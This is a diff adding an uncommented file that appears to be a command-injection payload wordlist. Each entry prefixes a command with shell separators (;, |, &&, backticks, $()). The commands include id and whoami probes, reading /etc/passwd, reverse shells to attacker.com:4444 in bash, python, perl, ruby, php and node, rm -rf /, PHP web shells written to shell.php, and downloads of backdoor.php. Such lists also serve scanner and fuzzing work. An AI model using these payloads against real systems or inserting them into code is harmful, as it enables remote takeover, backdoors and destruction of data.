@@ -1,0 +1,231 @@
+; id
+| id
+&& id
+|| id
+& id
+`id`
+$(id)
+; whoami
+| whoami
+&& whoami
+|| whoami
+& whoami
+`whoami`
+$(whoami)
+; uname -a
+| uname -a
+&& uname -a
+|| uname -a
+& uname -a
+`uname -a`
+$(uname -a)
+; ls
+| ls
+&& ls
+|| ls
+& ls
+`ls`
+$(ls)
+; pwd
+| pwd
+&& pwd
+|| pwd
+& pwd
+`pwd`
+$(pwd)
+; cat /etc/passwd
+| cat /etc/passwd
+&& cat /etc/passwd
+|| cat /etc/passwd
+& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; cat /etc/hosts
+| cat /etc/hosts
+&& cat /etc/hosts
+|| cat /etc/hosts
+& cat /etc/hosts
+`cat /etc/hosts`
+$(cat /etc/hosts)
+; echo HACKED
+| echo HACKED
+&& echo HACKED
+|| echo HACKED
+& echo HACKED
+`echo HACKED`
+$(echo HACKED)
+; curl http://attacker.com
+| curl http://attacker.com
+&& curl http://attacker.com
+|| curl http://attacker.com
+& curl http://attacker.com
+`curl http://attacker.com`
+$(curl http://attacker.com)
+; wget http://attacker.com/shell.php
+| wget http://attacker.com/shell.php
+&& wget http://attacker.com/shell.php
+|| wget http://attacker.com/shell.php
+& wget http://attacker.com/shell.php
+`wget http://attacker.com/shell.php`
+$(wget http://attacker.com/shell.php)
+; nc -e /bin/sh attacker.com 4444
+| nc -e /bin/sh attacker.com 4444
+&& nc -e /bin/sh attacker.com 4444
+|| nc -e /bin/sh attacker.com 4444
+& nc -e /bin/sh attacker.com 4444
+`nc -e /bin/sh attacker.com 4444`
+$(nc -e /bin/sh attacker.com 4444)
+; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+| bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+&& bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+|| bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+& bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+`bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`
+$(bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1')
+; sh -c 'sh -i >& /dev/tcp/attacker.com/4444 0>&1'
+| sh -c 'sh -i >& /dev/tcp/attacker.com/4444 0>&1'
+&& sh -c 'sh -i >& /dev/tcp/attacker.com/4444 0>&1'
+|| sh -c 'sh -i >& /dev/tcp/attacker.com/4444 0>&1'
+& sh -c 'sh -i >& /dev/tcp/attacker.com/4444 0>&1'
+`sh -c 'sh -i >& /dev/tcp/attacker.com/4444 0>&1'`
+$(sh -c 'sh -i >& /dev/tcp/attacker.com/4444 0>&1')
+; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+| python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+|| python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+& python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
+$(python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])')
+; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+| perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+&& perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+|| perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+& perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+`perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+$(perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};')
+; ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+| ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+&& ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+|| ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+& ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
+$(ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end')
+; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+| php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+&& php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+|| php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+& php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+`php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+$(php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");')
+; node -e 'require("child_process").exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1")'
+| node -e 'require("child_process").exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1")'
+&& node -e 'require("child_process").exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1")'
+|| node -e 'require("child_process").exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1")'
+& node -e 'require("child_process").exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1")'
+`node -e 'require("child_process").exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1")'`
+$(node -e 'require("child_process").exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1")')
+; rm -rf /
+| rm -rf /
+&& rm -rf /
+|| rm -rf /
+& rm -rf /
+`rm -rf /`
+$(rm -rf /)
+; chmod 777 /etc/passwd
+| chmod 777 /etc/passwd
+&& chmod 777 /etc/passwd
+|| chmod 777 /etc/passwd
+& chmod 777 /etc/passwd
+`chmod 777 /etc/passwd`
+$(chmod 777 /etc/passwd)
+; echo '<?php system($_GET["cmd"]); ?>' > shell.php
+| echo '<?php system($_GET["cmd"]); ?>' > shell.php
+&& echo '<?php system($_GET["cmd"]); ?>' > shell.php
+|| echo '<?php system($_GET["cmd"]); ?>' > shell.php
+& echo '<?php system($_GET["cmd"]); ?>' > shell.php
+`echo '<?php system($_GET["cmd"]); ?>' > shell.php`
+$(echo '<?php system($_GET["cmd"]); ?>' > shell.php)
+; echo '<?php eval($_POST["cmd"]); ?>' > shell.php
+| echo '<?php eval($_POST["cmd"]); ?>' > shell.php
+&& echo '<?php eval($_POST["cmd"]); ?>' > shell.php
+|| echo '<?php eval($_POST["cmd"]); ?>' > shell.php
+& echo '<?php eval($_POST["cmd"]); ?>' > shell.php
+`echo '<?php eval($_POST["cmd"]); ?>' > shell.php`
+$(echo '<?php eval($_POST["cmd"]); ?>' > shell.php)
+; echo '<?=shell_exec($_GET["cmd"])?>' > shell.php
+| echo '<?=shell_exec($_GET["cmd"])?>' > shell.php
+&& echo '<?=shell_exec($_GET["cmd"])?>' > shell.php
+|| echo '<?=shell_exec($_GET["cmd"])?>' > shell.php
+& echo '<?=shell_exec($_GET["cmd"])?>' > shell.php
+`echo '<?=shell_exec($_GET["cmd"])?>' > shell.php`
+$(echo '<?=shell_exec($_GET["cmd"])?>' > shell.php)
+; echo '<?php exec($_GET["cmd"]); ?>' > shell.php
+| echo '<?php exec($_GET["cmd"]); ?>' > shell.php
+&& echo '<?php exec($_GET["cmd"]); ?>' > shell.php
+|| echo '<?php exec($_GET["cmd"]); ?>' > shell.php
+& echo '<?php exec($_GET["cmd"]); ?>' > shell.php
+`echo '<?php exec($_GET["cmd"]); ?>' > shell.php`
+$(echo '<?php exec($_GET["cmd"]); ?>' > shell.php)
+; echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
+| echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
+&& echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
+|| echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
+& echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
+`echo '<?php passthru($_GET["cmd"]); ?>' > shell.php`
+$(echo '<?php passthru($_GET["cmd"]); ?>' > shell.php)
+; echo "HACKED" > index.html
+| echo "HACKED" > index.html
+&& echo "HACKED" > index.html
+|| echo "HACKED" > index.html
+& echo "HACKED" > index.html
+`echo "HACKED" > index.html`
+$(echo "HACKED" > index.html)
+; wget http://attacker.com/backdoor.php -O backdoor.php
+| wget http://attacker.com/backdoor.php -O backdoor.php
+&& wget http://attacker.com/backdoor.php -O backdoor.php
+|| wget http://attacker.com/backdoor.php -O backdoor.php
+& wget http://attacker.com/backdoor.php -O backdoor.php
+`wget http://attacker.com/backdoor.php -O backdoor.php`
+$(wget http://attacker.com/backdoor.php -O backdoor.php)
+; curl http://attacker.com/backdoor.php -o backdoor.php
+| curl http://attacker.com/backdoor.php -o backdoor.php
+&& curl http://attacker.com/backdoor.php -o backdoor.php
+|| curl http://attacker.com/backdoor.php -o backdoor.php
+& curl http://attacker.com/backdoor.php -o backdoor.php
+`curl http://attacker.com/backdoor.php -o backdoor.php`
+$(curl http://attacker.com/backdoor.php -o backdoor.php)
+; python -c 'import urllib.request;urllib.request.urlretrieve("http://attacker.com/backdoor.php","backdoor.php")'
+| python -c 'import urllib.request;urllib.request.urlretrieve("http://attacker.com/backdoor.php","backdoor.php")'
+&& python -c 'import urllib.request;urllib.request.urlretrieve("http://attacker.com/backdoor.php","backdoor.php")'
+|| python -c 'import urllib.request;urllib.request.urlretrieve("http://attacker.com/backdoor.php","backdoor.php")'
+& python -c 'import urllib.request;urllib.request.urlretrieve("http://attacker.com/backdoor.php","backdoor.php")'
+`python -c 'import urllib.request;urllib.request.urlretrieve("http://attacker.com/backdoor.php","backdoor.php")'`
+$(python -c 'import urllib.request;urllib.request.urlretrieve("http://attacker.com/backdoor.php","backdoor.php")')
+; php -r 'file_put_contents("backdoor.php", file_get_contents("http://attacker.com/backdoor.php"));'
+| php -r 'file_put_contents("backdoor.php", file_get_contents("http://attacker.com/backdoor.php"));'
+&& php -r 'file_put_contents("backdoor.php", file_get_contents("http://attacker.com/backdoor.php"));'
+|| php -r 'file_put_contents("backdoor.php", file_get_contents("http://attacker.com/backdoor.php"));'
+& php -r 'file_put_contents("backdoor.php", file_get_contents("http://attacker.com/backdoor.php"));'
+`php -r 'file_put_contents("backdoor.php", file_get_contents("http://attacker.com/backdoor.php"));'`
+$(php -r 'file_put_contents("backdoor.php", file_get_contents("http://attacker.com/backdoor.php"));')
+; perl -e 'use LWP::Simple;getstore("http://attacker.com/backdoor.php","backdoor.php")'
+| perl -e 'use LWP::Simple;getstore("http://attacker.com/backdoor.php","backdoor.php")'
+&& perl -e 'use LWP::Simple;getstore("http://attacker.com/backdoor.php","backdoor.php")'
+|| perl -e 'use LWP::Simple;getstore("http://attacker.com/backdoor.php","backdoor.php")'
+& perl -e 'use LWP::Simple;getstore("http://attacker.com/backdoor.php","backdoor.php")'
+`perl -e 'use LWP::Simple;getstore("http://attacker.com/backdoor.php","backdoor.php")'`
+$(perl -e 'use LWP::Simple;getstore("http://attacker.com/backdoor.php","backdoor.php")')
+; ruby -e 'require "open-uri";IO.copy_stream(open("http://attacker.com/backdoor.php"),"backdoor.php")'
+| ruby -e 'require "open-uri";IO.copy_stream(open("http://attacker.com/backdoor.php"),"backdoor.php")'
+&& ruby -e 'require "open-uri";IO.copy_stream(open("http://attacker.com/backdoor.php"),"backdoor.php")'
+|| ruby -e 'require "open-uri";IO.copy_stream(open("http://attacker.com/backdoor.php"),"backdoor.php")'
+& ruby -e 'require "open-uri";IO.copy_stream(open("http://attacker.com/backdoor.php"),"backdoor.php")'
+`ruby -e 'require "open-uri";IO.copy_stream(open("http://attacker.com/backdoor.php"),"backdoor.php")'`
+$(ruby -e 'require "open-uri";IO.copy_stream(open("http://attacker.com/backdoor.php"),"backdoor.php")')
+; node -e 'const http=require("http");const fs=require("fs");const file=fs.createWriteStream("backdoor.php");http.get("http://attacker.com/backdoor.php",(res)=>{res.pipe(file);});'
+| node -e 'const http=require("http");const fs=require("fs");const file=fs.createWriteStream("backdoor.php");http.get("http://attacker.com/backdoor.php",(res)=>{res.pipe(file);});'
+&& node -e 'const http=require("http");const fs=require("fs");const file=fs.createWriteStream("backdoor.php");http.get("http://attacker.com/backdoor.php",(res)=>{res.pipe(file);});'
+|| node -e 'const http=require("http");const fs=require("fs");const file=fs.createWriteStream("backdoor.php");http.get("http://attacker.com/backdoor.php",(res)=>{res.pipe(file);});'
+& node -e 'const http=require("http");const fs=require("fs");const file=fs.createWriteStream("backdoor.php");http.get("http://attacker.com/backdoor.php",(res)=>{res.pipe(file);});'
+`node -e 'const http=require("http");const fs=require("fs");const file=fs.createWriteStream("backdoor.php");http.get("http://attacker.com/backdoor.php",(res)=>{res.pipe(file);});'`
+$(node -e 'const http=require("http");const fs=require("fs");const file=fs.createWriteStream("backdoor.php");http.get("http://attacker.com/backdoor.php",(res)=>{res.pipe(file);});')
